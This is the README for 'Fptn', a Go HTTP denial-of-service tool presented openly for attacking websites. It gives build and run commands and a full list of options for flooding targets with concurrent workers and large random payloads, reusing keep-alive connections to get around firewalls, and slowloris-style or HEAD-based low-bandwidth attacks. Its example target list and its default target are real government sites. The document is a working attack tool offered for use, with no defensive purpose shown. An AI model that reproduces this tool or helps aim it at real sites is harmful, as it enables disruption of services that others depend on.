# Fptn HTTP DoS attack utility

Fptn is a simple HTTP DoS utility which can create a lot of different kinds of HTTP requests. By default it utilizes keep-alive connection to keep TCP connections open for multiple requests. This is useful in situations, when firewall blocks multiple connection attempts from one address. Keep alive can be switched off with `-keep-alive=false` param.

Requests are executed in loop on workers (concurrent go routines). Default number of workers is 20 per URL, but can be set to any number with `-workers` param.

Random content payload is attached to each request by default. It's 1MB in size, but can be changed with parameter `-payload-length` (in kB) or disabled with `-send-payload=false`.

## Build

Fptn is using packages from standard library only. So build is easy as this:

```
go build fptn.go
```


## Usage

Prepare list of target URLs in text file, each URL on separate line. Then run `fptn` like this:

```
$ cat targets.txt
https://kremlin.ru
https://mil.ru
https://rkn.gov.ru
$ ./fptn -sites-file=targets.txt
```

Other parameters to `fptn`:

```
  -delay int
    	Sleep time in milliseconds between each request per worker. Can be increased for keep-alive attacks similar to slowloris
  -error-file string
    	Where to write all errors encountered. File is truncated on each execution (default "/dev/null")
  -keep-alive
    	Whether to use keep-alive connections (true), or initiate new TCP connection on each request (false) (default true)
  -method string
    	HTTP method to use. Use HEAD for low bandwidth attacks (default "GET")
  -payload-length int
    	Payload length in kilobytes (default 1024)
  -send-payload
    	Attach payload with random content to each request (default true)
  -site string
    	Site URL to attack (default "https://kremlin.ru")
  -sites-file string
    	Path to file with URLs, each on a new line (default "./sites.txt")
  -workers int
    	Number of workers per URL (default 20)
```
